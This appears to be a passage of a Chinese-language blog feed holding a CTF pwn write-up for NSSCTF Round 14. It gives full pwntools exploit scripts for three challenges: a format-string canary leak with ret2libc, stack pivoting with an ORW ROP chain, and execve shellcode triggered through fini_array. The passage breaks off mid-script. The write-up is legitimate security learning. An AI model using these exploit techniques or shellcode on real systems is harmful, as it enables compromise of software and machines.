53409d139165be596412b0ce6218e40cf766d5858620c4a64ec228cabbe339391fe794e6b01da7ced5190c980f435cd191b7c0c29af1c814903d7336b104a9a89a2c8c23afbde34567e4b4dff137edbf42662abd376c576cb52baa6956156b423d9ef8104720a8ffe1a25353508adb0e5b9bc1f792308c7d3925e9f3dae10fafafafa9147ef6d9acc23312fe00ea20b5fe462255a3323ecde891373cf8e24293c637a0020df20a8af8134cb7ed4bf69687eef1d7530835d5b7e35f0326466466d986703a82ef250eb07f953c6dc8c7a4c6dc4a974b607a08beadda9d2151ceab44cedc25e2935dee1fbb34097dd0e93e21de23ddad6df41c917ced409bcd56a3f9452c47bc591aeddcd74b74cf152813dda42486dc078e14ef914a40cf6a72b551041f5b43c491dfa2fa72a8d9105c888c1efb3824b858a8ee9f405b9dff6185e3140489f9ac55667a1dbbbc5f1f59765722370fa379dac22a213bbc47085c134ed7b4c11db848bc342e8dbc4165c380126765ac45d8a5f7b8c123df857285ecf95853c173f1a169ab44d33930d1adb3e68e6c055627447f1d27806a3761e5cdb0aa49ee57f5d7bf27d54f1bba57d5624ed8d3a71ef3a53da9f9af7eedb33141f33eb33d2891f7ba52b9e481e0f1bc466e6a06bdd609df5ca8cddfcb4fc0ccfcd3b4cc4feb1a09f554a20566698fab4312d18fa53a512e93e9e542866577cd0d994f435499c8539ca4630646e150e56e09aa9c13b932bd15c1beb8100c439bc99f827a1c562bf7459e51e3b7de67c8d8f1c1f25ce0ceed7a727e7c8e250457f17472a37826f9549d8499988099a6460654b64a29237eabfcdde04afcd3bd1520c8df7c2d4c3ad22ef6b7e066aab1719850b949d30c8994dee3570bb77ce4bc34bb1eed337d747da65262f479d6770b9bca67c4548734abc50a0b5b3cbfdbc4b6c869f22b272b0f66ceae316cc35089a70893b4186bb03a0b429c96ca972d429bcd0aee5f1f98f0826abf762f0b7a2b2d8fce8669d2ca1bde28cbcd6535f8df1a8656826404c93dc272cc97e5d3a2dba298271214b2a8a8b463cc1a112e5c3a1a010783a081c5e356fbab9f7ecf78add30b0b10fc8834c96a172f88acedb79b957f099bd854c34c02c43b95b175b8260a7109c953f5d3a88688271cb415dbbb9a68af374f9855c6cb63116ddc92ae3b5b7a7bc14381b9f3185f5596e056bac38a013053e4d61525c55ceb0dcddc698063ea6c786fa75f1907c99b5f793350781e7a4fb0fed015f03978b510f5c1bcf65ee7661665d285887a8572e277cb55fdde225e5e63d6389cd72f8a8bbada0a61a68a2efc5701612484e660eb5974407c5393421680d1213d04f64d67579f0ba7233d4413d324f5d2520799185e3c7bea1c53c250264b597ba4dfd0a7073bf7898e491941f762e7bfd70618d5b394a2798b86c998e0820f742b963d94575951eeeedb4aed1baaab0ef92d30ba7b2977d8b362f6ced6465ff2321e4612f708a89a626c44a4f998a85d0cad6f08fbdf25046344de26a831898f62b9f6fb8df59a8bcbcc4e6b1768087cb15983f7958e07bd9ac4045a846454ffb04cd5790f8d4f4aa61fbc88874556cd307fa605a0f1c5bced3fc8bab6d270939fdec9b9c4ef1ba23f5eceefdf2fab17b42d4ced42e2a26dd0daf4642579f82009ea831205477afd11675f987257303d306a7fd846eab1972688536e4a7c28a7998ad6dafc8cbca3125612a6b5da17f204441f1ab67734c47e7cd0ac120be7aed97b507d9e1a9642897c620a5968cfead965163d5aa89a77bb08b47ccbb127550d879004518f4421b13ea619c2e0e6a9b7e6deb62e6c4536a3de0c0b12d53107cafea5c12976f35dfafc1ac97f82eaca745666fee02e0b22bb5c998c6579824e35a6e0b5daee5d4c18764a8185116619a64a806362212f2583a37863f08a03bc45fd64d8eb1741ac4a8e956e3c6056da1549891ae04b9ebf82dece66419b48f4a94c454ca3362fcf0f14a9cf0e23e2492e8c9e1686b51afd7529c3731c9a828bbbc25b676c15c439300da34c4fdd48c6609c0be92f32400c28a0601bc4c96618c1deb24694cdf4810ff98bebfb893e38189e5a062c32ba3dfb3a332a496de0f4985fe912b39b25e8b4bc5dd59790805209066d0346c297b9a35757e3f4e9a61a4867c53a9832b4463933ae920cbdfac87abb8f68c3e4bcf567deb0deae04743b6c000407cf7474b9884ae471a81ccab78fd4971d2011ba7b074f2225dc0b0a1da6daf990973763be7d347bcccfbf39b9cc28bef112474103954ecc50da16094e1e03e1d3a501529d1742930979c08fa4cce25b62b065ee5c19fa5223f0e72ca38b78d1538373c3904d21082103c0d8ee2d5573c101fb86fe8b2d6dbc385b4d48b56f826ea6bebbfa73db40d25f16677127d68546413f6c6e708b1a452ee96db2d43fc473e20245e3618055b27726d1d9055cec3893060cd38782c694c4317f65fb72255094689adc9cdfaee4ee89be71777bcb8836a89c31f01aa25396bb184d63982b242dc6e941d25ed7dc1016c72b6bed54b45760f333ee2c65a18afab647e03baa00b4bfe6574402b91add0b4945602ada8fafab717e186adda0be277fa32e92af49c6e4afa8ed35120d3179f3f085f62113e634be2767b21274b99ed1d397110b27950ccf43e32561d1f454b49dc52b030a0b81b5c14578568cf112a23ab11a57b1199d780ca689fc9c3323600ad3fbaf87ac603827cc7162c5ff67d6afdf2f49b91de67934cb34369e6ff8dea4cbadc0566243ffc760b07d1f4e4901a0f1338c2de0cd672a201c4638a3d128dcd97bf7b7a3921a6c37e6a1fa752c889e042c83c5933a761d63cbe3f80874598276b6285c80da49fb1bbfe49884171f0e03035da77069cf8232e8151e81bf876ce64e5518cc1867d776cc836dacba6d4f6eaefd7890959fcdb045aafeffcfaca85ecabeda04a7961843a581ba5a18b735ab801b117fadcc8094749ac3a11693c8a0d2ab7ff8ed4d1c2a801c7ee0a49d73f27bde093e9a56ed010b81a4ba265efd7efc19a2de6e86f3cc295df025fe0a4e134dfce406c644828e01587adc48101bca6ce1c4b1daa76d681c23162a896afa7ba647af1ad6e691fa14add9d1341aa1cf8230cff87bd7aa3e5f1119e3ebf0200871d2f94cfb432c46afc7d7b305756f4284b80f5804452d81f1156bfea4d6f2a7609f26fb005a08f306f6fc8500600a1af02d6ecd06c719b3dcd12ae745da75ca581d121cdc555371cc719961f8d7f3b75e7f50b5bfa64dcf6e5418e174c00c1502aa03f773cc3d53d3a1108ccf8b5783692975226174d89c2f428b0ff858e4cccf23c0f242284c26ba6b860cf890d7c38a0025b9865026b538c834ae0446512b33b0a7359b32fd99ca037b93d87af8b2b75cbfe0712ac6820947138fb3896203f033d14d7db9b899bcfa3c9b198f89d3b02d75581039b1f170ff02ec0123dcd24dc24b0395f38508a143f285aae8ab8f1fe302a7a6bb369f285e2261d0a45a5d49f4fec42b1f75696f4cf202b72215207b66de1e6733791150136e087706da0232cbee3a9e9e7a884de1435640315eb2b5be7c85ed71ced6e9a614165fb60014408b8d653be03e4db24f64f055d408cbec9494bfc2df7c4ce5fc1335bdba11c21a13f8c8e0bfe10c1216bdc2a46e8b543ff240b6a6e4eb16aca2f3a385cf01916fa12bb2e5da174b712794c01fd10fc7410236a84ad6df8221574ffdb302d45eb4cec8ee25085415fcd6afa1b37f43a4895e4ec51b034a460862f7e3b0c50b814027bc60c0d13f7a5246d9d6d56a6a6694260a02c2efee41c4bd774db2d82329c32bfd5d261abdf796fb25cd6181bd3b0867e6c8f9da1e284e6342b69796ce70acff2d617c5afa17dfa3733756829c497e49a3c7e2cc19289756204f334af9ee877c120e7d3a426dd2054e524b750e06485af71ab7da5bf862a9ad129da5c9c0c055859f599915b2950ec9d2911ad1f335a4f3f30db2947a63b2e4f401c23a7795b8c15b56ad136762f017f7d4bb4cdcfede9e9a6db6e054e077949a5a37e963321389d8e905e3ddf49a71be426a8395ce218961d8e1506fa1542aa948830b9db741d19fad653e4571f2aac267d94e99ad918c19b726f545989a1e5e50c390b453b9aa1d17ce7c225f3686a4af0c2ce8a0cfb8cbbc52e1fdd88ec3fdcf83cc8dee0f7bf56e757ee5cb1a3ec570435ada16b167006483073be4ef92397fc8dcf1bf0446345a3377d107d88d5376e7cc92e3429a8803923abcf242af114138dd6efb824d46b0ab90d08028304758a431a2f99f3c1adc3fec6a8297710a40abb237e8cfbbbe250be9f2a40344a9190c6c99154c9e0b846256e53355e2d4bd7a8c14da2fc2379b38d3486f76c585103f4f7b2cf999a3c3100c1d121e7adf93a87656a361d3cf00bd7c0b7b1807ec80a355c52b6438b3ab60e0d9bc37176dc139d691ab562dd487dfb79352dfc8af344d048e24b6a22ddc58d1fe4d3391af44f5255b05ed2897f27d8d8e2a93a8cbb365e921ba30cc461e36b554ae78bfb3ed607647f88f1e122d04e8281902e4e352d98950a483fcc8c18678db7d73da7f521387b2ada41ac26a583294562ee2757df5e059dffcf2dbf22735047a96a2f817d7332bea03ba3b79b402cb5aed595a7e1b12b00bc7fa92d00a6e77156f5e3dacea859bf20562b3a32e4088d64dc8003afd559c7ef3614d379eb05a7e722affb296f278bca765bb748531aa345b5ceecc2d36eae4b9c40183ee28f3cf9bf5b7db8a2ba40150f0a9bed146cb22717093abd1c855644ec27a46156a6b8f8d06757cf7098e270868ff8136c4cd6922cdbd1314c889da9283084a02a68a8009a7a55c332845b01ab2c562cbf33b3b5d9ceda4bfd1086d9a16e53243a054af123a1cbb52125506c3671e6ec9ebaba5ea60359c39a3c7cbd7300cf918b88ee55b978780bb77e161e31a99da2883c74a1c72d8e5956bb5a67e3b7e0785dbe0679963ba6b9998bd823116afccafe1c8bbb97e711081d32adca4f5b2417086c82af3b67d4dc6e0a5dd9802f7722529ed2e31438630c1b3fb3ef449ef6970dba87fa1567157cea16e79ad5889999e0292bda06ef02950ae0ae6d0cc3c454c703578ee7f7fba879cc4f41ec3fff558d851769cd1e51fc555c5d5c41040ad0370542fcb982d376d19a265d577436d6cb93fb3871d4b12a5cb14adc8f45f254b9a800533b853e71ce6ffabf933e31d0524e6f8525f0df6b894892cf42b5e07b59ae310f6d1406d0ce89d8ff58cfde19df6726ad267fe02503ff6fe1ca8383ec71e23704bbb3979f203ae2b9e7086d196468f2504053a5b29fb61d99314db6ac0129813a241df5235df6660b5f76623ef73b7a5d223785a2146085242a532c0096e2a62dbec1739dd96521a6f9db0651fb22f046e820631773093e0fc093ad6c29d35360fcc6d26d6a94431b953d2f3b3da6ad65cf60c7c027a6b92a50764113e25733d0b107f6260df608cc327c385899d63369f58a334ef30330ff954704f864224dba53cf5074eb65197fe94a53c35f412eae9c69c741d8732ad941f584946efa94137031f7865271743e0b52cb7990c169eea11db9220d61a472fc613e18d1d02fc0e46937fde1669d467a5eac9dc5e244f93d2057b76fd2a2829ff1e0569dfcd19597e1afa183a34cd76b7f7f434a9fea05cec55c6d0e444f059f572e572300eac3a1e2139a20f6fde813e4636473d0a4de757ce5af8f254c645c96b7085f27a6629513da44d97041e2c1516d9ceae95c7dd8755e7879df8c2d41fada70a22883149c7209d712111109db31f922e694f1ad47726ad17df9ec89ef913cef50eadfee6925a99cd3a761471c35d71b7ecbe250a47d49032f4b99f2c956977d0f7faafe43e146c5336866314b8195fbc5493adfee7ea9fbce88d588015225a80da76f6574fc0480d6a00606d5bc9eb28d2314241557a7257f510a07a3cdfb955d707d246d341843b2123f630cf1309b30ad07e623d220ead7ee1cf4949f2e512e3a83724a0de5d4e3925767673de7f03ea29a6592b6e3942c94d6fc72903fa7468f961860d58cf5d086c5a3fd6fffef8eca062f0e8eefdab730837559cbf667ef876a00f79511ecedd43067aea4a65f350eb4e34fa2f9efc10d1ef00f366bae1f10dde592085b8a700f27cf45840b2bc760ae88a3912367e411f38fc347b3095ffc55ff6b7ee624e74995a3863ab1cec68599553e7590c78b2a3cd12bf7e68c8cdfedc27987b92ed2a838167cea4062f9e1ce89e92b9876deff7f8d0f2dac44d779eace32173e2ba7d264ee7f9e402ae4439a1fd8609ec4f2b7e1ae0dd90316207248a1bbed0467e150c3c5d78a0c822987feb20cc82a2a942729343df7b895a69a8f0b8954ef7b1341390deea050530dd072ae63536eefb757042f1f39d9f88d33a1156282c5d7957ae91159ea431efa94ab7a303d0cd87c18a4a1ccf51b6cebbea063f4d077cbbe779df27bc241db1213e28e1f29fe051ffc97178d51e07fbf4654535e2e8a8eaebccd682d983f8033db738dd5c19be25db339ecd50c5184248d92c550a5ea981fcbfce8e18ef72b2da54192ed00b31870876eb1e429e26095bbe64708260f5a423ebda66cf6d9fba5505bbec6af1f6a4bb66c0e29fea489dc2619337a86bc3ce7df933fbddcb7831f92fdd96e2399631175446effc90c24736612d89646b4a52f1db52107b8fc758b80387a477aa74c7878617fc277db4cd23ff8eb8815717e3ecbe53a058088e594a9cd4a30966d847d6d96613609fc7bc663bdd4735cb3d3de742b3aab2e0ceb00504a727bc3dd6c462716efdcf88f0d41f084a88a0dc104398f83297c628c3f73788f344ab2241b2ca1f2c1336b9ed70f406635330d6a0ad8ca3ba4458e369c60d40a9d9d56ca68e9e992b4e9919492b241e9954299ccb72433dd3aaaa7ed86cb02a0c032eb572f5314269b16b58f5a1219175259b3577a24fccbe6a5d6025734d3403dfd07fe4a75e9dfab2ad46e8414a0342ad91c496c199d5006f15a9e5095c79a86471846f2b4b9d46ac647aa394f12e6c25085bc609e97c4c06899a1bb1e61f670ceddce870fb48f0930ac3c8447cc6f1460c8219e2cb59f09e0eddd2d62dc914d5bff05cad7ea7e9b984423f1f68608513889acd474b41922e458228ab0869853960470a7d995440db82ba3acfb8f28ea910c7a992cf9c033e3b0479560d83ed0d3b7d9e4dc3f63880d32b9329b87085dbc2bf2ec51fc7ef22a6f62dbc4f5afb6265567d4322fc44f0eed4a781d8f2afab462ca3d582de448c880d0ca72a470abdb6202f0e3fb47873e3c8dccf744597b730a6323e74b23f043413f71d03ea6e789d799527108e3694ab2ef007e597351deba290f584a3308176a66c942f01ac9323d047f5a198db35b541ba24423e78fa95161ce960e7408d90536ceb19a96a67e1b154d2d3601eb9838ddd3ac47b849dff7e8218e98673a8c988514d5ff45874e96db73276a946cb9c3c76e2f093a880f280d5b3ccc30b37057ad5539f504291db2bced6ffcd4dd68962ae2e4e7d623c4035fff6c57a4d1730a75a646b4a7a4f2e8da4589950b5a161a3af34182d8297b411a53d490da228a7fef9fb78f2c404c01f578dbedaf244f278e487bbf7d79cf71c9d0e12f288c0cda58059a5e02c4854e1a5df15ea6f07ae5dd7c3d95ae63763d160d7ce13feb76e56dfccd144c52ff3d2dff7c23b53cd1abde059357b4697535bd0f539a41c364c06c538689a0e7459b09f99a7770db1111d284b7e3ce60fddf5adaae227f2ce3d57fea9cf3c7bceef9479a6d3e2fb85109c1b623b313874e82de4f492732767dddf3e5182772b24d5724745a6dac112c6ad9c25e0b261d55efa68bf89e0523ca8b8b1b1799074167ab003fd6b1cde07aa43f28f7ac86bc9e856303bbc6c95e4da9b4d08d911efe8a6e0ace4222de1aa43e9fce58cc80eccddc6fd7dcf14cfdcb7a66d214fd68092843da59b8a697d2251125e48ff31402b9c48e87f8bff61d5e09471b43b17c58897d612e2404a5eda8a909a9c1e2bb22d49ecfd95b59db228f8a076760615728d490f34c15e52e0a2774c3e4119164d7d7c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 培训 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTFRound#14</title>
      <link href="/2023/07/31/NSSCTFRound-14/"/>
      <url>/2023/07/31/NSSCTFRound-14/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSCTFRound-14"><a href="#NSSCTFRound-14" class="headerlink" title="NSSCTFRound#14"></a>NSSCTFRound#14</h1><p>本次NSSCTFRound赛有点事情没有写，后续回来复现，估计当时也只能写出来两道题，还是太菜了，又在两位师傅的帮助提示下完成了四道题的复现，希望自己以后可以多多努力</p><h2 id="love"><a href="#love" class="headerlink" title="love"></a>love</h2><p>很简单的一道题格式化字符串，赛后群里面幽林师傅说本意是打STL结构体，但是这里被非预期了，直接泄露了canary然后ret2text就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#p=process(&#x27;./love&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28435</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Toka\n&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;%520c%9$n%17$p%15$p&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh=libc_base+libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x00000000004013f3</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x8</span>)+p64(canary)*<span class="number">2</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)+p64(ret)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;level&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="rbp"><a href="#rbp" class="headerlink" title="rbp"></a>rbp</h2><p>这里给了一个0x10的溢出，可以利用它来进行栈迁移，同时程序开了沙箱，我们利用orw的ropchain就可以getshell</p><p>首先我们布栈为下面的样子</p><table><thead><tr><th>stack</th><th>content</th></tr></thead><tbody><tr><td>rsp</td><td>‘a’*0x210</td></tr><tr><td>rbp</td><td>rbp-&gt;0x404500</td></tr><tr><td>retaddr</td><td>0x401292（read_func）</td></tr></tbody></table><p>这样子在退出的时候，程序会执行leave；ret</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov %rbp,%rsp</span><br><span class="line">pop %rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>也没有正经写过栈迁移的博客，就在这里一步步分析了</p><p>首先把rbp的值给rsp，然后把栈顶给rbp，这样进行之后，我们的fake_stack就是下面的样子</p><table><thead><tr><th>fake_stack</th><th>content</th></tr></thead><tbody><tr><td>0x7fxxxxxxxx</td><td>xxxxxx</td></tr><tr><td>0x7fxxxxxxxx</td><td>xxxxxx</td></tr><tr><td>rbp</td><td>0x404500</td></tr></tbody></table><p>read函数刚开始会执行 <em>lea    rax, [rbp+buf]</em> 在本题中就是rbp-0x210,也就是read的地址是0x4042f0。我们gdb进去看一下对不对</p><p><img src="/../images/1690772404850.png" alt="1690772404850"></p><p>这是执行leave之前，可以看到rbp确实是我们布置的样子，接下来进行leave</p><p><img src="/../images/1690772668110.png" alt="1690772668110"></p><p>这里把rbp的值给了rsp之后，pop了rbp，所以rsp+8，到了retaddr的地方，符合我们的预期，接下来就是ret去执行read函数</p><p><img src="/../images/1690772864913.png" alt="1690772864913"></p><p>可以看到，read的buf地址确实是我们刚才计算的0x4042f0，然后读入我们的payload</p><table><thead><tr><th>fake_stack</th><th>content</th></tr></thead><tbody><tr><td>0x4042f0</td><td>pop_rdi</td></tr><tr><td>0x4042f8</td><td>read_got</td></tr><tr><td>0x404300</td><td>puts_plt</td></tr><tr><td>0x404308</td><td>0x4012ee(pop rbp;ret)</td></tr><tr><td>0x4042310</td><td>0x404500(old rbp)</td></tr><tr><td>0x404318</td><td>0x401292(read)</td></tr><tr><td>0x404250</td><td>0x4042e8</td></tr><tr><td>0x404258</td><td>leave;ret</td></tr></tbody></table><p>之后程序同样会进行一次leave；ret</p><p><img src="/../images/1690773387519.png" alt="1690773387519"></p><p>这下会把rsp调到0x404508，rbp改为0x4042e8，然后ret，此时会pop rip，所以rsp++，rsp为0x404510，会再进行一次leave；ret，我们继续看</p><p><img src="/../images/1690773607490.png" alt="1690773607490"></p><p>继续执行leave；ret</p><p>rsp调到0x4042f0，接下来要pop rip，然后程序就去执行pop rdi；ret了</p><p>这样子我们可以获得libc的地址，然后进行pop_rbp,给rbp一个值，也就是oldrbp，之后再次进行read，写orw就好了，后续步骤和上面的是一样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug==<span class="number">1</span>：</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./rbp&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./rbp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x404500</span></span><br><span class="line">vuln_addr = <span class="number">0x401270</span></span><br><span class="line">leave_ret = <span class="number">0x4012BF</span></span><br><span class="line">read=<span class="number">0x401292</span></span><br><span class="line">read_addr=bss-<span class="number">0x210</span></span><br><span class="line">pop_rdi = <span class="number">0x401353</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;it&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x210</span> + p64(<span class="number">0x404500</span>) + p64(read)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x4012EE</span>) + p64(bss) + p64(<span class="number">0x401292</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x210</span>) + p64(read_addr-<span class="number">0x8</span>) + p64(leave_ret)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base_addr))</span><br><span class="line">open_addr = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">syscall_addr = libc_base + <span class="number">0x00000000000630a9</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x0000000000036174</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line"></span><br><span class="line">orw = <span class="string">b&#x27;./flag\00\00&#x27;</span></span><br><span class="line">orw += p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">2</span>) + p64(pop_rdi) + p64(<span class="number">0x4042f0</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(syscall_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(<span class="number">0x404600</span>) + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(<span class="number">0x404600</span>) + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(write_addr)</span><br><span class="line"></span><br><span class="line">payload = orw.ljust(<span class="number">0x210</span>) + p64(read_addr) + p64(leave_ret)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p>这里参考了一些stone爷的exp，手动艾特stone-san <del>自己写脚本的功底实在是太烂了，有空要好好学一下python了</del></p><p>这道题相当于给了一个任意地址写，常规的方法是先改flag为负数，然后写一个shellcode就可以了，最后利用fini_array进行调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./xor&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./xor&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr,val</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;addr: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">hex</span>(addr)).encode())</span><br><span class="line">p.recvuntil(<span class="string">&#x27;value: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">hex</span>(val)).encode())</span><br><span class="line"></span><br><span class="line">flag_addr=<span class="number">0x600bcf</span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">shell_addr=<span class="number">0x600bd0</span></span><br><span class="line">write(flag_addr,<span class="number">0xff</span>)<span class="comment">#</span></span><br><span class="line">shellcode=<span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i,k <span class="keyword">in</span> <span class="built_in">enumerate</span>(shellcode):</span><br><span class="line">write(shell_addr+i,k)</span><br><span class="line"></span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_got))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_plt))</span><br><span class="line">fini_entry=<span class="number">0x400610</span></span><br><span class="line">fini=<span class="number">0x600970</span></span><br><span class="line">shell=p32(shell_addr^fini_entry)</span><br><span class="line"><span class="keyword">for</span> i,k <span class="keyword">in</span> <span class="built_in">enumerate</span>(shell):</span><br><span class="line"><span class="keyword">if</span> k!=<span class="number">0</span>:</span><br><span 